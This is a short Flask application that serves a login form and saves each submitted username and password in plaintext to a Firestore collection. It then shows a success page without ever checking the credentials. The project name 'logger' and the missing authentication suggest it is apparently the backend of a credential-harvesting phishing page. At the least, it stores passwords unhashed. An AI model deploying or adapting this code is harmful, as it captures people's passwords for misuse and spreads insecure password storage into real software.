from flask import Flask, render_template, request, redirect, url_for
import firebase_admin
from firebase_admin import credentials, firestore
import os

# Firebase setup
cred_path = "/etc/secrets/logger-f9c87-firebase-adminsdk-fbsvc-26f12e5bb9.json"  # Make sure this path exists on Render
cred = credentials.Certificate(cred_path)

# Initialize the Firebase app
firebase_admin.initialize_app(cred)

# Get Firestore client
db = firestore.client()

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Save to Firestore
    db.collection('users').add({
        'username': username,
        'password': password
    })

    return redirect('/success')

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
